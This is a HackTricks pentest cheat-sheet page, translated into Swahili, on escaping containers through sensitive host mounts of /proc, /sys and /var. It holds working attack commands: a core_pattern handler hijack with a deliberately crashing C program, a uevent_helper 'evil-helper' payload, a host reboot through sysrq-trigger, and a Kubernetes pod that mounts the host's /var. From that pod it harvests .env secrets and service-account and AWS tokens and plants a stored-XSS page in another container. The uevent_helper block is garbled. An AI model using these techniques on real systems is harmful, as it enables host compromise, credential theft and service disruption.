# Sensitive Mounts

{{#include ../../../../banners/hacktricks-training.md}}

Ufunuo wa `/proc`, `/sys`, na `/var` bila kutengwa kwa namespace kunaleta hatari kubwa za usalama, ikiwa ni pamoja na kuongezeka kwa uso wa shambulio na ufunuo wa taarifa. Maktaba haya yana faili nyeti ambazo, ikiwa zimepangwa vibaya au kufikiwa na mtumiaji asiyeidhinishwa, zinaweza kusababisha kutoroka kwa kontena, mabadiliko ya mwenyeji, au kutoa taarifa zinazosaidia mashambulizi zaidi. Kwa mfano, kuunganisha vibaya `-v /proc:/host/proc` kunaweza kupita ulinzi wa AppArmor kutokana na asili yake ya msingi wa njia, na kuacha `/host/proc` bila ulinzi.

**Unaweza kupata maelezo zaidi ya kila hatari inayoweza kutokea katika** [**https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts**](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)**.**

## procfs Vulnerabilities

### `/proc/sys`

Maktaba hii inaruhusu ufikiaji wa kubadilisha vigezo vya kernel, kawaida kupitia `sysctl(2)`, na ina subdirectories kadhaa za wasiwasi:

#### **`/proc/sys/kernel/core_pattern`**

- Imeelezwa katika [core(5)](https://man7.org/linux/man-pages/man5/core.5.html).
- Ikiwa unaweza kuandika ndani ya faili hii inawezekana kuandika bomba `|` ikifuatiwa na njia ya programu au skripti ambayo itatekelezwa baada ya ajali kutokea.
- Mshambuliaji anaweza kupata njia ndani ya mwenyeji kwa kontena lake akitekeleza `mount` na kuandika njia ya binary ndani ya mfumo wa faili wa kontena lake. Kisha, angamiza programu ili kufanya kernel itekeleze binary nje ya kontena.

- **Mfano wa Upimaji na Ukatili**:
```bash
[ -w /proc/sys/kernel/core_pattern ] && echo Yes # Test write access
cd /proc/sys/kernel
echo "|$overlay/shell.sh" > core_pattern # Set custom handler
sleep 5 && ./crash & # Trigger handler
```
Angalia [hii posti](https://pwning.systems/posts/escaping-containers-for-fun/) kwa maelezo zaidi.

Mfano wa programu inayoshindwa:
```c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) {
buf[i] = 1;
}
return 0;
}
```
#### **`/proc/sys/kernel/modprobe`**

- Imeelezwa katika [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
- Inashikilia njia ya mzigo wa moduli ya kernel, inayoitwa kwa ajili ya kupakia moduli za kernel.
- **Mfano wa Kuangalia Upatikanaji**:

```bash
ls -l $(cat /proc/sys/kernel/modprobe) # Angalia upatikanaji wa modprobe
```

#### **`/proc/sys/vm/panic_on_oom`**

- Imejumuishwa katika [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
- Bendera ya kimataifa inayodhibiti ikiwa kernel itakumbwa na hofu au kuanzisha OOM killer wakati hali ya OOM inapotokea.

#### **`/proc/sys/fs`**

- Kulingana na [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html), ina chaguzi na taarifa kuhusu mfumo wa faili.
- Upatikanaji wa kuandika unaweza kuwezesha mashambulizi mbalimbali ya kukatiza huduma dhidi ya mwenyeji.

#### **`/proc/sys/fs/binfmt_misc`**

- Inaruhusu kujiandikisha kwa wakalimani wa fomati za binary zisizo za asili kulingana na nambari yao ya uchawi.
- Inaweza kusababisha kupanda kwa haki au upatikanaji wa shell ya mzizi ikiwa `/proc/sys/fs/binfmt_misc/register` inaweza kuandikwa.
- Ukatili unaohusiana na maelezo:
- [Poor man's rootkit kupitia binfmt_misc](https://github.com/toffan/binfmt_misc)
- Mafunzo ya kina: [Kiungo cha video](https://www.youtube.com/watch?v=WBC7hhgMvQQ)

### Wengine katika `/proc`

#### **`/proc/config.gz`**

- Inaweza kufichua usanidi wa kernel ikiwa `CONFIG_IKCONFIG_PROC` imewezeshwa.
- Inafaida kwa washambuliaji kubaini udhaifu katika kernel inayotumika.

#### **`/proc/sysrq-trigger`**

- Inaruhusu kuanzisha amri za Sysrq, ambayo inaweza kusababisha upya wa mfumo mara moja au vitendo vingine vya dharura.
- **Mfano wa Kuanzisha Upya Mwenyeji**:

```bash
echo b > /proc/sysrq-trigger # Inarejesha mwenyeji
```

#### **`/proc/kmsg`**

- Inafichua ujumbe wa buffer ya ring ya kernel.
- Inaweza kusaidia katika mashambulizi ya kernel, kuvuja anwani, na kutoa taarifa nyeti za mfumo.

#### **`/proc/kallsyms`**

- Inataja alama za kernel zilizotolewa na anwani zao.
- Muhimu kwa maendeleo ya mashambulizi ya kernel, hasa kwa kushinda KASLR.
- Taarifa za anwani zinapunguziliwa mbali ikiwa `kptr_restrict` imewekwa kuwa `1` au `2`.
- Maelezo katika [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).

#### **`/proc/[pid]/mem`**

- Inashirikiana na kifaa cha kumbukumbu ya kernel `/dev/mem`.
- Kihistoria ilikuwa na udhaifu wa mashambulizi ya kupanda kwa haki.
- Zaidi kuhusu [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).

#### **`/proc/kcore`**

- Inawakilisha kumbukumbu ya kimwili ya mfumo katika muundo wa ELF core.
- Kusoma kunaweza kuvuja maudhui ya kumbukumbu ya mfumo wa mwenyeji na kontena zingine.
- Ukubwa mkubwa wa faili unaweza kusababisha matatizo ya kusoma au kuanguka kwa programu.
- Matumizi ya kina katika [Dumping /proc/kcore in 2019](https://schlafwandler.github.io/posts/dumping-/proc/kcore/).

#### **`/proc/kmem`**

- Kiolesura mbadala kwa `/dev/kmem`, kinawakilisha kumbukumbu ya virtual ya kernel.
- Inaruhusu kusoma na kuandika, hivyo kubadilisha moja kwa moja kumbukumbu ya kernel.

#### **`/proc/mem`**

- Kiolesura mbadala kwa `/dev/mem`, kinawakilisha kumbukumbu ya kimwili.
- Inaruhusu kusoma na kuandika, kubadilisha kumbukumbu yote kunahitaji kutatua anwani za virtual hadi za kimwili.

#### **`/proc/sched_debug`**

- Inarudisha taarifa za kupanga mchakato, ikipita ulinzi wa PID namespace.
- Inafichua majina ya michakato, IDs, na vitambulisho vya cgroup.

#### **`/proc/[pid]/mountinfo`**

- Inatoa taarifa kuhusu maeneo ya kupandisha katika namespace ya kupandisha ya mchakato.
- Inafichua eneo la `rootfs` ya kontena au picha.

### Udhihirisho wa `/sys`

#### **`/sys/kernel/uevent_helper`**

- Inatumika kwa kushughulikia `uevents` za kifaa cha kernel.
- Kuandika kwenye `/sys/kernel/uevent_helper` kunaweza kutekeleza skripti zisizo za kawaida wakati wa kuanzisha `uevent`.
- **Mfano wa Ukatili**: %%%bash

#### Inaunda payload

echo "#!/bin/sh" > /evil-helper echo "ps > /output" >> /evil-helper chmod +x /evil-helper

#### Inapata njia ya mwenyeji kutoka OverlayFS mount kwa kontena

host*path=$(sed -n 's/.*\perdir=(\[^,]\_).\*/\1/p' /etc/mtab)

#### Inapanga uevent_helper kwa msaidizi mbaya

echo "$host_path/evil-helper" > /sys/kernel/uevent_helper

#### Inasababisha uevent

echo change > /sys/class/mem/null/uevent

#### Inasoma matokeo

cat /output %%%

#### **`/sys/class/thermal`**

- Inadhibiti mipangilio ya joto, ambayo inaweza kusababisha mashambulizi ya DoS au uharibifu wa kimwili.

#### **`/sys/kernel/vmcoreinfo`**

- Inavuja anwani za kernel, ambayo inaweza kuhatarisha KASLR.

#### **`/sys/kernel/security`**

- Inashikilia kiolesura cha `securityfs`, kinachoruhusu usanidi wa Moduli za Usalama za Linux kama AppArmor.
- Upatikanaji unaweza kuwezesha kontena kuzima mfumo wake wa MAC.

#### **`/sys/firmware/efi/vars` na `/sys/firmware/efi/efivars`**

- Inafichua violesura vya kuingiliana na mabadiliko ya EFI katika NVRAM.
- Usanidi mbaya au ukatili unaweza kusababisha kompyuta za mkononi zisizoweza kuanzishwa au mashine za mwenyeji zisizoweza kuanzishwa.

#### **`/sys/kernel/debug`**

- `debugfs` inatoa kiolesura cha ufuatiliaji "bila sheria" kwa kernel.
- Historia ya masuala ya usalama kutokana na asili yake isiyo na mipaka.

### Udhihirisho wa `/var`

Folda ya mwenyeji ya **/var** ina soketi za wakati wa kontena na mifumo ya faili ya kontena.
Ikiwa folda hii imepandishwa ndani ya kontena, kontena hiyo itapata upatikanaji wa kusoma-kandika kwa mifumo ya faili ya kontena zingine
ikiwa na haki za mzizi. Hii inaweza kutumika vibaya kuhamasisha kati ya kontena, kusababisha kukatizwa kwa huduma, au kuingiza nyuma kontena nyingine na programu zinazotumika ndani yao.

#### Kubernetes

Ikiwa kontena kama hii imewekwa na Kubernetes:
```yaml
apiVersion: v1
kind: Pod
metadata:
name: pod-mounts-var
labels:
app: pentest
spec:
containers:
- name: pod-mounts-var-folder
image: alpine
volumeMounts:
- mountPath: /host-var
name: noderoot
command: [ "/bin/sh", "-c", "--" ]
args: [ "while true; do sleep 30; done;" ]
volumes:
- name: noderoot
hostPath:
path: /var
```
Ndani ya **pod-mounts-var-folder** chombo:
```bash
/ # find /host-var/ -type f -iname '*.env*' 2>/dev/null

/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/201/fs/usr/src/app/.env.example
<SNIP>
/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/135/fs/docker-entrypoint.d/15-local-resolvers.envsh

/ # cat /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/105/fs/usr/src/app/.env.example | grep -i secret
JWT_SECRET=85d<SNIP>a0
REFRESH_TOKEN_SECRET=14<SNIP>ea

/ # find /host-var/ -type f -iname 'index.html' 2>/dev/null
/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/57/fs/usr/src/app/node_modules/@mapbox/node-pre-gyp/lib/util/nw-pre-gyp/index.html
<SNIP>
/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/140/fs/usr/share/nginx/html/index.html
/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/132/fs/usr/share/nginx/html/index.html

/ # echo '<!DOCTYPE html><html lang="en"><head><script>alert("Stored XSS!")</script></head></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/140/fs/usr/sh
are/nginx/html/index2.html
```
The XSS ilifikiwa:

![Stored XSS via mounted /var folder](/images/stored-xss-via-mounted-var-folder.png)

Kumbuka kwamba kontena HALIHITAJI kuanzishwa upya au chochote. Mabadiliko yoyote yaliyofanywa kupitia folda iliyowekwa **/var** yatafanyika mara moja.

Unaweza pia kubadilisha faili za usanidi, binaries, huduma, faili za programu, na profaili za shell ili kufikia RCE ya kiotomatiki (au ya nusu-kiotomatiki).

##### Ufikiaji wa hati za wingu

Kontena linaweza kusoma tokens za K8s serviceaccount au tokens za AWS webidentity ambazo zinamruhusu kontena kupata ufikiaji usioidhinishwa kwa K8s au wingu:
```bash
/ # find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
/host-var/lib/kubelet/pods/21411f19-934c-489e-aa2c-4906f278431e/volumes/kubernetes.io~projected/kube-api-access-64jw2/..2025_01_22_12_37_42.4197672587/token
<SNIP>
/host-var/lib/kubelet/pods/01c671a5-aaeb-4e0b-adcd-1cacd2e418ac/volumes/kubernetes.io~projected/kube-api-access-bljdj/..2025_01_22_12_17_53.265458487/token
/host-var/lib/kubelet/pods/01c671a5-aaeb-4e0b-adcd-1cacd2e418ac/volumes/kubernetes.io~projected/aws-iam-token/..2025_01_22_03_45_56.2328221474/token
/host-var/lib/kubelet/pods/5fb6bd26-a6aa-40cc-abf7-ecbf18dde1f6/volumes/kubernetes.io~projected/kube-api-access-fm2t6/..2025_01_22_12_25_25.3018586444/token
```
#### Docker

Ushirikiano katika Docker (au katika matumizi ya Docker Compose) ni sawa kabisa, isipokuwa kwamba kawaida
faili za mifumo ya faili ya kontena nyingine zinapatikana chini ya njia tofauti ya msingi:
```bash
$ docker info | grep -i 'docker root\|storage driver'
Storage Driver: overlay2
Docker Root Dir: /var/lib/docker
```
Hivyo mifumo ya faili iko chini ya `/var/lib/docker/overlay2/`:
```bash
$ sudo ls -la /var/lib/docker/overlay2

drwx--x---  4 root root  4096 Jan  9 22:14 00762bca8ea040b1bb28b61baed5704e013ab23a196f5fe4758dafb79dfafd5d
drwx--x---  4 root root  4096 Jan 11 17:00 03cdf4db9a6cc9f187cca6e98cd877d581f16b62d073010571e752c305719496
drwx--x---  4 root root  4096 Jan  9 21:23 049e02afb3f8dec80cb229719d9484aead269ae05afe81ee5880ccde2426ef4f
drwx--x---  4 root root  4096 Jan  9 21:22 062f14e5adbedce75cea699828e22657c8044cd22b68ff1bb152f1a3c8a377f2
<SNIP>
```
#### Kumbuka

Njia halisi zinaweza kutofautiana katika mipangilio tofauti, ndiyo maana njia bora ni kutumia amri ya **find** kutafuta mifumo ya faili ya kontena nyingine na tokeni za SA / utambulisho wa wavuti.

### Marejeleo

- [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)
- [Understanding and Hardening Linux Containers](https://research.nccgroup.com/wp-content/uploads/2020/07/ncc_group_understanding_hardening_linux_containers-1-1.pdf)
- [Abusing Privileged and Unprivileged Linux Containers](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2016/june/container_whitepaper.pdf)

{{#include ../../../../banners/hacktricks-training.md}}
